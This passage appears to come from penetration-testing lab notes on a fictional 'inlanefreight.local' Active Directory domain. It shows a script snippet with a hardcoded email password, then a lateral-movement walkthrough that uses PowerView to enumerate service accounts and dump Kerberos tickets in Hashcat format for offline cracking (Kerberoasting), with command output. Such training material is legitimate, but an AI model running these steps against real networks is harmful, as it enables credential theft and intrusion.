''Most likely not needed, but if needed to pass authorization for connecting and sending emails
Const cdoUserName = "account@inlanefreight.local"   'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED
Const cdoPassword = "L337^p@$w0rD"
```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~308_

```

        
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN |Select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc

There are quite a few. Let's export these to a CSV file for offline processing.

        powershell
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
```
